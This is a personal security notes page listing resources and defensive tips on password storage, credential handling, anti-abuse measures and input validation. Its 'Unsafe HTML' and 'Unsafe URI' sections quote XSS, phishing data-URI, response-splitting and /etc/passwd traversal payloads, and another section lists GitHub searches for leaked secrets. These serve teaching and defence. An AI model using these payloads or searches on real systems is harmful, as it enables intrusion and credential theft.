The protection resistance is matter of time, money or opportunities. Anything is vulnerable directly or indirectly.

> on ne peut chiffrer ou déchiffrer une donnée, l'inscrire ou la supprimer d'une mémoire sans apporter et déposer une trace sur l'ordinateur, sans modifier et prendre quelque chose qui s'y trouvait auparavant.
— [Zythom: Le principe de l'échange de Locard](http://zythom.blogspot.fr/2007/08/le-principe-de-lchange-de-locard.html)

> It's cheaper to get hacked than build strong IT defenses
– [Sad reality: It's cheaper to get hacked than build strong IT defenses • The Register](http://www.theregister.co.uk/2016/09/23/if_your_company_has_terrible_it_security_that_could_be_a_rational_business_decision/)

![door keypad where some keys are worn](CmF_ddwWMAEX7xv.jpg) [I sense a weak password](https://twitter.com/jcolman/status/748019163831074816)

> areoplanes include strict systems to separate the cabin from the cockpit [...] concept of "security domains"
— [Peak Internet of Shit - All But One "Watch Dogs 2" Hack Works in REAL LIFE – LearntEmail](https://learntemail.sam.today/blog/peak-internet-of-shit-all-but-one-watch-dogs-2-hack-works-in-real-life/)

> We had cryptographic potatoes for dinner. They were salted and hashed.
— Andromeda Yelton

> Don't trust anyone

- [The Bare Minimum of Security](http://nothingofvalue.org/)

## Resources

- [Template:Information security — Wikipedia](https://en.wikipedia.org/wiki/Template:Information_security)
- [Articles - CGSecurity](http://www.cgsecurity.org/wiki/Articles)
- https://observatory.mozilla.org/
- [Defence in depth — Wikipedia](https://en.wikipedia.org/wiki/Defence_in_depth)
- [Slides and code](https://github.com/eoftedal/presentations) and [Erlend Oftedal's stuff on Github](http://eoftedal.github.io/)
- http://www.kb.cert.org/CERT_WEB/services/vul-notes.nsf/bymetric?open&start=1
- https://github.com/Hack-with-Github/Awesome-Hacking
- [A practical guide to securing macOS](https://github.com/drduh/macOS-Security-and-Privacy-Guide)
- Free OS X Security Tools [Objective-See](https://objective-see.com/products.html)
- IP lists of suspicious activities (some lists are non-free) [I-BlockList | Home](https://www.iblocklist.com/)
- [Wiki Pages - html5security - HTML5 Security Cheatsheet - Google Project Hosting](https://code.google.com/p/html5security/w/list)

### Web security

- [A practical security guide for web developers](https://github.com/FallibleInc/security-guide-for-developers/blob/master/security-checklist.md)
- [Projects/OWASP Secure Web Application Framework Manifesto/Releases/Current/Manifesto - OWASP](https://www.owasp.org/index.php/Projects/OWASP_Secure_Web_Application_Framework_Manifesto/Releases/Current/Manifesto)
- [HTML5 Security Cheatsheet](https://github.com/cure53/H5SC) and [HTML5 Security Cheatsheet](https://html5sec.org/)
- [The Open Web Application Security Project - OWASP](https://www.owasp.org/index.php/Main_Page)
- [Everything you need to know about HTTP security headers - Appcanary](https://blog.appcanary.com/2017/http-security-headers.html)

## Data access and integrity

> A chain is only as strong as its weakest link

- [A collection of awesome penetration testing resources](https://github.com/enaqx/awesome-pentest)

Against attacks, read/write access or modifications

- [Public-key cryptography — Wikipedia](https://en.wikipedia.org/wiki/Public-key_cryptography)
- [RSA (cryptosystem) — Wikipedia](https://en.wikipedia.org/wiki/RSA_(cryptosystem))
- [Portail:Cryptologie — Wikipédia](https://fr.wikipedia.org/wiki/Portail:Cryptologie)
- [Portail:Sécurité informatique — Wikipédia](https://fr.wikipedia.org/wiki/Portail:S%C3%A9curit%C3%A9_informatique)
- [59Hardware - Dossier : La cryptographie](http://wayback.archive.org/web/20090227061422/http://59hardware.net/Tests/Jeux_Videos_et_Logiciels/Dossier_:_La_cryptographie.html)

### Password storage

Aka authentification data storage

See [Password](#password)

Use [bcrypt](http://en.wikipedia.org/wiki/Bcrypt) or a better one: https://github.com/p-h-c/phc-winner-argon2

**The issue with bcrypt is the limited supported password to [max 72 chars](https://stackoverflow.com/questions/3002828/bcrypt-says-long-similar-passwords-are-equivalent-problem-with-me-the-gem-o/4772058#4772058).**
To circumvent that you need to create a hash (ex: SHA512, 64 bytes) of that password before. But don't treat the hash as hexa string, but as bytes. See "You're not really going to help people much who use long passwords by hashing first. Some groups you can definitely help. Some you can definitely hurt." [php - How to hash long passwords (\>72 characters) with blowfish - Stack Overflow](https://stackoverflow.com/questions/16594613/how-to-hash-long-passwords-72-characters-with-blowfish/16597402#16597402)
See also [cryptography - Pre-hash password before applying bcrypt to avoid restricting password length - Information Security Stack Exchange](https://security.stackexchange.com/questions/6623/pre-hash-password-before-applying-bcrypt-to-avoid-restricting-password-length) and [sha 256 - Is there a way to use bcrypt with passwords longer than 72 bytes securely? - Cryptography Stack Exchange](https://crypto.stackexchange.com/questions/24993/is-there-a-way-to-use-bcrypt-with-passwords-longer-than-72-bytes-securely)

- [Plain Text Offenders](http://plaintextoffenders.com/) [plaintextoffenders/offenders.csv at master · plaintextoffenders/plaintextoffenders](https://github.com/plaintextoffenders/plaintextoffenders/blob/master/offenders.csv)
- [L'art de stocker des mots de passe - LinuxFr.org](https://linuxfr.org/users/elyotna/journaux/l-art-de-stocker-des-mots-de-passe)
- [Choosing the Right Cryptography Library for your PHP Project: A Guide - Paragon Initiative Enterprises Blog](https://paragonie.com/blog/2015/11/choosing-right-cryptography-library-for-your-php-project-guide)
- [Storing Passwords in a Highly Parallelized World · Homepage of Hynek Schlawack](https://hynek.me/articles/storing-passwords/)
- https://github.com/PolyPasswordHasher/PolyPasswordHasher
- [start [CBCrypt]](https://cbcrypt.org/doku.php)
- [Agile Blog | On hashcat and strong Master Passwords as your best protection](https://blog.agilebits.com/2013/04/16/1password-hashcat-strong-master-passwords/)
- [Secure Salted Password Hashing - How to do it Properly](https://crackstation.net/hashing-security.htm)
- [Portable PHP password hashing ("password encryption") framework](http://www.openwall.com/phpass/)
- [How To Safely Store A Password | codahale.com](http://codahale.com/how-to-safely-store-a-password/)
- [Serious Security: How to store your users’ passwords safely | Naked Security](https://nakedsecurity.sophos.com/2013/11/20/serious-security-how-to-store-your-users-passwords-safely/)
- [What technical reasons are there to have low maximum password lengths? - Information Security Stack Exchange](http://security.stackexchange.com/questions/33470/what-technical-reasons-are-there-to-have-low-maximum-password-lengths/33471#33471)
- [Serious Security: How to store your users’ passwords safely – Naked Security](https://nakedsecurity.sophos.com/2013/11/20/serious-security-how-to-store-your-users-passwords-safely/)
- [How Dropbox securely stores your passwords | Dropbox Tech Blog](https://blogs.dropbox.com/tech/2016/09/how-dropbox-securely-stores-your-passwords/)
- search public leaked authentification informations
	VCS revision contains password 
	
	- [Google Hacking Database, GHDB, Google Dorks](https://www.exploit-db.com/google-hacking-database/)
	- https://github.com/search?p=2&q=mysqli_connect+http&type=Code
	- https://github.com/search?q=%22rds.amazonaws.com%22&type=Code
	- https://github.com/search?utf8=&q=id_rsa&type=Commits&ref=searchresults
	- https://github.com/search?p=2&q=smtp.gmail.com+pass&ref=searchresults&type=Code&utf8=%E2%9C%93
	- https://github.com/search?p=2&q=DriverManager.getConnection%28&ref=searchresults&type=Code&utf8=%E2%9C%93
	- https://github.com/search?q=DBI.connect&ref=searchresults&type=Code&utf8=%E2%9C%93
	- https://github.com/search?utf8=%E2%9C%93&q=add+secret&type=Commits&ref=searchresults https://github.com/search?utf8=%E2%9C%93&q=add+secrets&type=Commits&ref=searchresults
	- https://github.com/search?utf8=%E2%9C%93&q=add+password&type=Commits&ref=searchresults https://github.com/search?utf8=%E2%9C%93&q=add+passwords&type=Commits&ref=searchresults
	- https://github.com/search?p=2&q=remove+password+oops&ref=searchresults&type=Commits&utf8=%E2%9C%93
	- https://github.com/search?utf8=%E2%9C%93&q=remove+password&type=Commits&ref=searchresults
	- https://github.com/search?utf8=&q=changed+password&type=Commits&ref=searchresults
	- [GitLeaks - Search Engine for exposed secrets on the web](https://gitleaks.com/)

#### Crendentials used in job schedulers

Like cron tasks

Executed commands or env vars appears in `ps` or in system log (could be transmited by email, etc.)

Commands often support external config file (curl: `.netrc`, mysql: `.my.cnf`, wget: `.wgetrc`, etc.). Use it with a restricted read access (only 400 or 600 mode for the specific user `chmod u=wr,g=,o= config`).
Alternatively, you can set the password in env vars `MYSQL_PWD="foo" mysqldump -ubackup --all-databases > dump.sql`

Some commands (ssh, sftp, scp, git, rsync, and any other commands that use SSH) support [SSH server](https://www.jveweb.net/en/archives/2010/08/defining-ssh-servers.html) (`man ssh_config`) and SSH keys:

```sh
host="theservername"
hostname="subdomain.domain.tld"
user="username"
port=34567

cat << EOF >> ~/.ssh/config

Host $host
HostName $hostname
User $username
Port $port
IdentityFile ~/.ssh/${user}@${hostname}_key
EOF

ssh-keygen -t rsa -b 4096 -C "$user" -f "~/.ssh/${user}@${hostname}_key" -N "" -q
# instead of "ssh -p 34567 username@subdomain.domain.tld" you can now use "ssh theservername""
```

Some other commands (curl, wget, rexec, ftp) support [`.netrc` file](https://www.gnu.org/software/inetutils/manual/html_node/The-_002enetrc-file.html) password file. Use as follow:

```
machine ftp.cyberciti.biz
login myusername
password mypassword
```

```sh
chmod u=wr,g=,o= .netrc
# if used as root:
#sudo chown root .netrc
```

See also [.netrc - Everything curl](https://ec.haxx.se/usingcurl/usingcurl-netrc)

You can also use a SFTP batch file (`-d`) and all similar mecanisms

- [Password-less login](#password-less-login)
- SSH: use `ssh-keygen` (see `ssh-copy-id`) `ssh-keygen -t rsa -f keyfile -N ""` (create keyfile without passphrase)
- [BashFAQ/069 - Greg's Wiki](http://mywiki.wooledge.org/BashFAQ/069) - "I want to automate an ssh (or scp, or sftp) connection, but I don't know how to send the password...."
- [how to pass a password with a cron job safely? - Unix & Linux Stack Exchange](http://unix.stackexchange.com/questions/176747/how-to-pass-a-password-with-a-cron-job-safely)
- [script - Where to store security credentials (aka passwords) for special cron jobs? - Super User](http://superuser.com/questions/420033/where-to-store-security-credentials-aka-passwords-for-special-cron-jobs)
- [mysql - Mysqldump launched by cron and password security - Stack Overflow](https://stackoverflow.com/questions/6861355/mysqldump-launched-by-cron-and-password-security)
- [How can I automate an SFTP transfer between two servers? - Ask Leo!](https://askleo.com/how_can_i_automate_an_sftp_transfer_between_two_servers/)
- [How to mirror/sync a remote ftp folder with a local folder | Sina Salek Official Site](http://sina.salek.ws/content/how-mirrorsync-remote-ftp-folder-local-folder)
- [authentication - How can I set up password-less SSH login? - Ask Ubuntu](http://askubuntu.com/questions/46930/how-can-i-set-up-password-less-ssh-login)
- [Easiest way to copy ssh keys to another machine? - Ask Ubuntu](http://askubuntu.com/questions/4830/easiest-way-to-copy-ssh-keys-to-another-machine/4833#4833)

### Secret sharing

Multiple private keys

Symmetric algorithm (like AES) + public key encryption algorithm (like RSA)

![This Lock Can Be Opened With 1 Lock ... No Matter Which One](This%20lock%20can%20be%20opened%20with%201%20lock%20...%20no%20matter%20which%20one.jpg) (OR gate, doesn't share the same key, using multiple private keys, see the [reddit post](https://www.reddit.com/r/pics/comments/68jboj/this_lock_can_be_opened_with_1_lock_no_matter/). See also daisychain locks / Multiple Padlock)

- [Secret sharing — Wikipedia](https://en.wikipedia.org/wiki/Secret_sharing)
- [encryption - Multiple private keys - Cryptography Stack Exchange](https://crypto.stackexchange.com/questions/44846/multiple-private-keys/44849#44849)
- [Multiple private keys for single public key - Cryptography Stack Exchange](https://crypto.stackexchange.com/questions/24125/multiple-private-keys-for-single-public-key/24128#24128)

### Prevent and detect violation

Aka breach

**You can defeat majority of violation but never all.**

![Secured](Prevent%20violation/Secured.jpg)
![When You Only Enforce Input Validations Client Side](Prevent%20violation/When%20you%20only%20enforce%20input%20validations%20client-side.jpg)

Content submission: bots create account, add review, video, message / post (SPAM), aimbot faking play games (cheat), etc.

- **never give feedback** if a violation is detected
- move the trust logic to the trusted party (the server, central logic) or as validator authority (validate transaction / scores with replay-data)
- sponsor: New account need a sponsor (acquaintance) (engage his responsibility) or publicly ask for it to all members by providing additional identifications elements (profile on other website: social network, personal website, etc.)
	Use human resource to verify the identity of the seeker

	* https://www.journalduhacker.net/login
- use captcha (Turing test)
	- [I'm Not a Human : Breaking the Google reCAPTCHA](https://www.blackhat.com/docs/asia-16/materials/asia-16-Sivakorn-Im-Not-a-Human-Breaking-the-Google-reCAPTCHA-wp.pdf)
	- [chihuahua or muffin, sheepdog or mop , puppy or bagel, labradoodle or fried chickenshiba or marshmallow, parrot or guacamole, etc.](https://twitter.com/teenybiscuit/status/667777205397680129)
- use nonce or cookies
- require a phone number, verify it (by sending a verification code). Check reused for different accounts
- verify email (send an verification link)
- authentificate with [multi-factors](https://en.wikipedia.org/wiki/Multi-factor_authentication) see also [Universal 2nd Factor](https://en.wikipedia.org/wiki/Universal_2nd_Factor)
- [prevent XSS and injection](#xss-and-injection-prevention)
- check emptyness and validate values. See [Third party data](#third-party-data)
- use time as a limit (lifespan)
- denunciation / reporting
- blacklist or whitelists of IPs (or ranges), browsers, clients names, words, etc.
- use `/robots.txt`:
    ```
	User-agent: *
	Disallow: /
    ```
- use honeypots
	"It's a trap"
    
    ```html
	<!-- Require CSS support. Add hidden (display: none) input field and detect if it's filled. -->
	<style>
	/* email h0n3yp07 */
	#test_email{
		display: none;
	}
	</style>
	<input id="real_email" type="email" name="real_email" size="25" value="">
	<input id="test_email" type="email" name="email" size="25" value="">
	<!-- if test_email if filled, the sender have a high probability to trick you -->
    ```

	Or add hidden fake entries (for a directory page with list of file). If the link is accessed, there is a high probability it's a scrapper. What append if the trigger link is discovered and inserted in ads / others websites (to trigger false positive)... by using rotation (detect only in some periode of time)?
	
	Use instead quota or slowdown or auto logout (and reduce timeout/quantity each time) mechanisms to prevent scrapping. Display a message to allow the user to contact you directy, by email or phone in case it's really legit.

	- add fake data, aka "copyright trap", "paper town". [Fictitious entry — Wikipedia](https://en.wikipedia.org/wiki/Fictitious_entry) Ex: for map data provider add fake town, etc. [Agloe, New York — Wikipedia](https://en.wikipedia.org/wiki/Agloe,_New_York)
	- [html - How do I prevent site scraping? - Stack Overflow](https://stackoverflow.com/questions/3161548/how-do-i-prevent-site-scraping/3161695#3161695)
	- [Fictitious entry — Wikipedia](https://en.wikipedia.org/wiki/Fictitious_entry)
	- [Publisher under fire for fake article webpages : Nature News & Comment](http://www.nature.com/news/publisher-under-fire-for-fake-article-webpages-1.20154)
	- Crawlers and scrappers https://github.com/JayBizzle/Crawler-Detect
	- [The Web's Largest Community Tracking Online Fraud & Abuse | Project Honey Pot](http://www.projecthoneypot.org/)
- include archive or image bomb but not used as is (attack). Ex: use it raw data as key for encryption. See [Exploits](Compression#exploits)
	- [10 GB in a 27 KB Gzip File \[My Present To HTTP Scanners\] -](https://rehmann.co/blog/10-gb-27-kb-gzip-file-present-http-scanners/)
- detect physically impossible for one human to react below some timespan or to move quicker than some speed or repeat too much times similar action (flood). Ex. nobody could send 100 reviews in few days (specially if the reviews are more than 100 chars)
	Use statistics (point cloud, graphs, threshold, etc.) and compare with the average people. Ex: ingame real people can't always aim perfectly (perfect angles values)
- [Copyright infringement](Conception#copyright-infringement)
- use counter-measure against side-channel leaks based on time (timing attack):
	See [Timing attack](#timing-attack)

For contexts where code/data is given to untrusted parties (games, webapp, downloaded native app):

- [Hide data](#hide-data)
- encrypted files (code) use param provided by the preloader. If the default value is used instead, the app run in a standalone mode: someone try to hack it (track IP + all infos)
- Always force a fresh download of preloaders (dynamically generated?)
- no hard code keys, tokens and IDs in source code
- remove debug symbols
- save value snapshots at random time interval
- check memory alteration. Never store a numeric or a string of the result / score. Use pointer, etc.
- use intergrity checks / DRM: [Subresource Integrity](#subresource-integrity), native non overwritable class method of VM API, etc.
- detect tools and modifications:

    ```js
	// See [795547 - Detecting deveoper tools open status kinda againis your princibles - chromium - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=795547#c8)
	// See [799791 - DevTools can be detected using redefined nodeType getter - chromium - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=799791#c3)
	Object.defineProperty(new Image()/*document.createElement("any")*/, "nodeType", {
		get: function() {
			// web tools are active (Chrome)
			return 1;
		}
	});
	```
    
    ```js
	var minimalUserResponseInMiliseconds = 100;
	var before = Date.now();
	debugger;
	if (Date.now() - before > minimalUserResponseInMiliseconds) {
		// user had to resume the script manually via opened dev tools
	}

	// Detects if DevTools are open
	// (assuming that user has caching disabled when DevTools are open which is common)
	// works in all major browsers

	// some cachable resource to check
	const resource = 'https://code.jquery.com/jquery-3.2.1.slim.min.js';
	// skip first check
	let first = true;

	setInterval(() => {
		const start = Date.now();
		fetch(resource).then(() => {
			if (first) {
				first = false;
				return;
			}
			if (Date.now() - start >= 10) { // resource is not cached
				// No cache in dev tools is active
			}
		});
	}, 1000);

	var baseline_measurements = [];
	var measurements = 20;
	var warmup_runs = 3;
	
	const status = document.documentElement.appendChild(document.createTextNode("DevTools are closed"));
	const junk = document.documentElement.insertBefore(document.createElement("div"), document.body);
	junk.style.display = "none";
	const junk_filler = new Array(1000).join("junk");
	const fill_junk = () => {
		var i = 10000;
		while (i--) {
			junk.appendChild(document.createTextNode(junk_filler));
		}
	};
	const measure = () => {
		if (measurements) {
			const baseline_start = performance.now();
			fill_junk();
			baseline_measurements.push(performance.now() - baseline_start);
			junk.textContent = "";
			measurements--;
			setTimeout(measure, 0);
		} else {
			baseline_measurements = baseline_measurements.slice(warmup_runs); // exclude unoptimized runs
			const baseline = baseline_measurements.reduce((sum, el) => sum + el, 0) / baseline_measurements.length;
		
			setInterval(() => {
				// In actual usage you would also check document.hasFocus()
				// as background tabs are throttled and get false positives
				const start = performance.now();
				fill_junk();
				const time = performance.now() - start;
				status.data = "DevTools are " + (time > 1.77 * baseline ? "open" : "closed");
				junk.textContent = "";
			}, 1000);
		}
	};
	
	setTimeout(measure, 200);
    ```

    ```js
	var threshold = 160;
	setInterval(function () {
			var widthThreshold = window.outerWidth - window.innerWidth > threshold;
			var heightThreshold = window.outerHeight - window.innerHeight > threshold;
			
			if (!(heightThreshold && widthThreshold) && ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
				// devtools is opened
			} else {
				// devtools is closed (or undocked, or a sidebar is opened)
			}
	}, 500);
    ```
	
	- [DevTools Undocked · Issue #15 · sindresorhus/devtools-detect · GitHub](https://github.com/sindresorhus/devtools-detect/issues/15#issuecomment-215908435)
	- [sindresorhus/devtools-detect: Detect if DevTools is open and its orientation](https://github.com/sindresorhus/devtools-detect)

Automated systems are not perfect, humans too

> A good approach would be to white-list non-infringing sources
— [Warner Brothers reports own site as illegal - BBC News](http://www.bbc.com/news/technology-37275603), [Warner Bros. flags own site for piracy, orders Google to censor pages | Ars Technica](http://arstechnica.com/tech-policy/2016/09/warner-bros-flags-own-site-for-piracy-dmca-google/)

- [Interview d'un vendeur de cheat et enquête auprès des développeurs de jeux vidéo](http://www.nofrag.com/2016/mai/28/49198/)
- [Securing a Flash game’s variables using flash_proxy | Kinsman Games](https://kinsmangames.wordpress.com/2010/04/08/securing-a-flash-games-variables-using-flash_proxy/)
- [actionscript 3 - What is the best way to stop people hacking the PHP-based highscore table of a Flash game - Stack Overflow](https://stackoverflow.com/questions/73947/what-is-the-best-way-to-stop-people-hacking-the-php-based-highscore-table-of-a-f)
- [DVIA (Damn Vulnerable iOS App) - A vulnerable iOS app for pentesting](http://damnvulnerableiosapp.com/)
- [Cheating in online games — Wikipedia](https://en.wikipedia.org/wiki/Cheating_in_online_games)
- [Cheating in Video Games » Feross.org](http://feross.org/cheating-in-video-games/)
- [Sécurité par l'obscurité](http://fr.wikipedia.org/wiki/S%C3%A9curit%C3%A9_par_l%27obscurit%C3%A9)
- [Security through obscurity - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Security_through_obscurity)
- [Flash Player Security Advanced Walkthrough | jpauclair](https://jpauclair.net/2009/12/11/flash-player-security-advanced-walkthrough/)
- [How to protect flash games](how_to_protect_flash_games.pdf)

See also [Hacking](#hacking)

#### Third party data

It's unsafe data. You need to handle care and isolate it.

**Never rely the data comes from outside your application (user inputs, front application messages, thrid party server messages).**
Clean it depends it usage. Ex.: when send a mail, remove all "\n\r" of all header fields

- don't use native deserialization. Use XML, JSON or [Query string](https://en.wikipedia.org/wiki/Query_string) formats. [Deserialization of untrusted data - OWASP](https://www.owasp.org/index.php/Deserialization_of_untrusted_data)
- [escape character](https://en.wikipedia.org/wiki/Escape_character)
- `intval($input)`
- `filter_var($input, FILTER_VALIDATE_EMAIL)`
- [Data Validation « WordPress Codex](https://codex.wordpress.org/Data_Validation)
- use dedicated domain for hosting third party documents/resources (image, HTML, CSS, JS). For proxing, etc.
- [minimaxir/big-list-of-naughty-strings: The Big List of Naughty Strings is a list of strings which have a high probability of causing issues when used as user-input data.](https://github.com/minimaxir/big-list-of-naughty-strings)
- [The Hitchhiker's Guide to SQL Injection prevention](https://phpdelusions.net/sql_injection)
- text, URL, link, 2D/3D data can contains offencive (insult, nudity, obscenity, etc.) text, scene, symbol, gesture, etc. in an image, 3D object, points on a map, ASCII text image
	**Text: Don't think you can manage the problem with just a blacklist of words** (what about lookalike, slang, backward-slang?)
	Forbidden/profanity words domains: Politic, racism, religious, sex, insults, drogs, weight (related to food industry), competing/rival companies...
	
	> If it can be killed, people will kill it. If it can't be killed, people will try and may succeed. If it can be destroyed, it will always be broken. If it can be moved, people will draw dongs or write obscenities with it.
	
	See [User generated content problems](Conception#User generated content problems)

	- [Scunthorpe problem — Wikipedia](https://en.wikipedia.org/wiki/Scunthorpe_problem)
	- [Text transform](Text#Text transform)
	- [shortened URLs](https://en.wikipedia.org/wiki/URL_shortening#Shortcomings)
	- [Slip Me Some Skin - The Hacker Factor Blog](http://www.hackerfactor.com/blog/index.php?/archives/479-Slip-Me-Some-Skin.html) - Problems with skin-detection algorithms
	- [SwiftOnSecurity on Twitter: "YouTube comments are now in color, apparently https://t.co/lCtNI76L6u"](https://twitter.com/SwiftOnSecurity/status/772643289434509312) - Draw swastika with ascii art (here with colored [Block Element](https://en.wikipedia.org/wiki/Block_Elements))
	- [Erik D Aker on Twitter: "Thi guy sped by me on the freeway. Had a strong feeling thi wa a Unicode codepoint. In my gut I knew what it was. https://t.co/4B3oHSXXAi"](https://twitter.com/erewok/status/699788390166695936) - Licence plate with then unicode representation U+1F595, see 🖕, [The finger - Wikipedia](https://en.wikipedia.org/wiki/The_finger)
	- [ASCII art - Wikipedia](https://en.wikipedia.org/wiki/ASCII_art)
	- [All the dirty word from Google' "what do you love" project: http://www.wdyl.com/](https://gist.github.com/jamiew/1112488)
	- [Support for multiple language by wagoid · Pull Request #6 · KanoComputing/nodejs-profanity-util](https://github.com/KanoComputing/nodejs-profanity-util/pull/6/files) - Multilanguages swearwords
	- [Seven dirty word - Wikipedia](https://en.wikipedia.org/wiki/Seven_dirty_words)
	- [Category:English swear word - Wiktionary](https://en.wiktionary.org/wiki/Category:English_swear_words)
	- [Megan Spoopy Fox on Twitter: "Funny story - we were asked to make dong detection software for LEGO Universe too. We found it to be utterly impossible at any scale."](https://twitter.com/glassbottommeg/status/604407061380640768)
- clipboard data
	* [Copy & Pest - A case-study on the clipboard, blind trust and invisibl…](http://www.slideshare.net/x00mario/copypest)
- CSS
	* [Scriptless Attacks - Stealing the Pie without touching the Sill](http://www.slideshare.net/x00mario/stealing-the-pie/)
- [JavaScript - Unsafe HTML](JavaScript#unsafe-html)

Always store data from third party in an external folder, outside root of the web server, and use `open_basedir` to protect against local inclusion

See also

- [Vulnerabilities](#vulnerabilities)
- [Safe String Theory for the Web — Acko.net](http://acko.net/blog/safe-string-theory-for-the-web/)

##### Unsafe HTML

- **Do not decode with `s.replace(/&amp;/g, "&").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&#39;/g, "'").replace(/&quot;/g, '"')`** https://github.com/WebReflection/html-escaper#why https://github.com/WebReflection/html-escaper/blob/master/html.js https://github.com/mathiasbynens/he
- **Note: All browsers don't support the same syntax** [HTML5 Security Cheatsheet - A collection of HTML5 related XSS attack vectors](https://github.com/cure53/H5SC) see [XSS and injection vulnerabilities](#xss-and-injection-vulnerabilities)
- [Detergent.io](https://detergent.io/) and [codsen/detergent: The text cleaner/encoder for web and email development](https://github.com/codsen/detergent)
- `<noscript><noscript></noscript><script>confirm(1)</script></noscript>`
- `htmlspecialchars()` or (`htmlentities()`). `'<a href="' . htmlspecialchars($url) . '">Link</>'` You can use `ENT_QUOTES` as flag to escape simple quotes. And you should check the protocol of `$url` before.
	`<form name="test" action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" method="post">` else `http://example.com/form.php?d=%22%3E%3Cscript%3Ealert('xss')%3C/script%3E%3Cfoo%22`
	
	- [Using PHP_SELF in the action field of a form](http://www.html-form-guide.com/php-form/php-form-action-self.html)
- Escape JSON in HTML
	* In element's attribute
		`<div data-test="<?php echo htmlspecialchars(json_encode($data, JSON_HEX_TAG | JSON_UNESCAPED_SLASHES)) ?>">`
	* In `<script type="application/json">`, in `<script>` (where type will be `application/javascript`, and use `JSON_PARTIAL_OUTPUT_ON_ERROR`) or any other element
		`echo 'var data = ' . json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP | JSON_UNESCAPED_SLASHES);`
	
	* [php - Is json_encode Sufficient XSS Protection? - Stack Overflow](https://stackoverflow.com/questions/12062146/is-json-encode-sufficient-xss-protection)
	* [php - Why does JSON encoder adds escaping character when encoding URLs? - Stack Overflow](https://stackoverflow.com/questions/3723243/why-does-json-encoder-adds-escaping-character-when-encoding-urls)
- `esc_attr($value)`

##### Unsafe chars

- [Unicode Security Guide](http://websec.github.io/unicode-security-guide/)
- can contains special chars and emoji: `éà}`, etc. Ex: emoji in bank account nickname broke banking system https://twitter.com/ajlobster/status/735240869859753985
- [Glitchr ‮ (@glitchr_) / Twitter](https://mobile.twitter.com/glitchr_)

##### Unsafe URI

- `http://evil.com/@good.com` the domain is not `good.com`
- `http://good.com%2f@evil.com/` the domain is not `good.com`
- `file://my.domain/tmp/example.html` the domain is `my.domain`, but often ignored
- `https://accounts.youtube.com/accounts/SetSID?continue=https://www.google.com/amp/s/evil.com/evil.swf` (redirect to `evil.swf`) redirection (account login, etc.) don't know if the trusted target, has been compromized (or allow this kind of redirection)
- `http://good.com%0a%0a%0aTrust%20me.%20It%27s%20totally%20legit.%09%09%09%09%09%0a%0a%0a%0a%0a%0a%0a%0a@evil.com/` is a valid URL, but could be displayed in browser URL bar (or link hover) as `http://good.com`
- `http://x%0aContent-Length%3a99%0a%0a.victim.website/1` and `http://victim.website%00.attacker.website/evil.html` (null char wrongly used to break the domain as `victim.website`). See [Webkit URLs](https://alf.nu/WebkitURLs)
- `xn--wkd-8cdx9d7hbd.org` is not equal to `wіkіpеdіа.org`, but look the same in browser address bar It's a valid [IDN](https://en.wikipedia.org/wiki/Internationalized_domain_name#ASCII_spoofing_concerns) which use [punycode](https://en.wikipedia.org/wiki/Punycode) encoding
- on `http://good.com` URL `//evil.com` the domain is `evil.com`
- filter out data URIs:
	* `data:text/html;charset=UTF-8,https://good.com/some/long/path/follwed/by/html/<html><body><form action=http://evil.com><button>Fake re-login form</button></form></body></html>`
	* `data:text/html;charset=UTF-8,alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}`
	Retect to parameter `http://victim.com/?param=value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>`
	https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OTG-INPVAL-016)
- filter out file URIs. If you get its content (like PHP `file_get_contents()`): `file:///etc/passwd`
	* [If your code accepts URIs as input..](https://blog.steve.fi/If_your_code_accepts_URIs_as_input__.html)
- `http://e­x­a­m­p­l­e­.­com` is not `http://example.com` (use SHY - U+00AD chars)
	> Soft hyphens have been used to obscure malicious domains or URLs in e-mail spam.
	[Soft hyphen — Wikipedia](https://en.wikipedia.org/wiki/Soft_hyphen#Security_issues)
	
	Many browsers ignore SHY chars in URL. That means `http://e­x­a­m­p­l­e­.­com` will be interpreted as `http://example.com`
- Some chars in file path are not supported on Windows: [Git for Windows accidentally creates NTFS alternate data streams](http://latkin.org/blog/2016/07/20/git-for-windows-accidentally-creates-ntfs-alternate-data-streams/) with char `:` in filename
- `urlencode()` and `rawurlencode()` for URLs `$url = 'http://localhost/' . rawurlencode($page) . '?foo=' . urlencode($foo) . '&bar=' . urlencode($bar)`. The same with `encodeURI()`, `encodeURIComponent()`
	See also [`http_build_query()`](http://php.net/manual/en/function.http-build-query.php) and [`parse_url()`](http://docs.php.net/manual/en/function.parse-url.php)
- `snprintf(&s, 0x80u, "texts/%s.json", ".////////////////////////////////////////////////////////////////////////////////////////../../../../../etc/passwd")` overflow the 128 byte string value
- `http://localhost`, `http://0`, `http://[::0]`
- [Google Safe Browsing  |  Google Developers](https://developers.google.com/safe-browsing/) - Chrome, Firefox, Safari, etc. use this service to alert users for fraudulent websites

##### Unsafe HTTP headers

- `$_SERVER['HTTP_HOST']` contains value defined by the `Host:` header.
- `$_SERVER['SERVER_NAME']` can contains the value defined by the `Host:` header.
	Unless [UseCanonicalName](http://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname) (for Apache) is set or name-based virtual hosts are used (but still the case for the default site / default server).
	- [php - HTTP_HOST vs. SERVER_NAME - Stack Overflow](https://stackoverflow.com/questions/2297403/http-host-vs-server-name/2297421#2297421)
	- [apache - PHP $_SERVER\['HTTP_HOST'\] vs. $_SERVER\['SERVER_NAME'\], am I understanding the man pages correctly? - Stack Overflow](https://stackoverflow.com/questions/1459739/php-serverhttp-host-vs-serverserver-name-am-i-understanding-the-ma/1461430#comment1309905_1460201)
	- [CommonMisconfigurations - Httpd Wiki](https://wiki.apache.org/httpd/CommonMisconfigurations#Not_setting_a_ServerName_in_a_virtual_host.)
	- [How nginx processes a request](http://nginx.org/en/docs/http/request_processing.html#how_to_prevent_undefined_server_names)
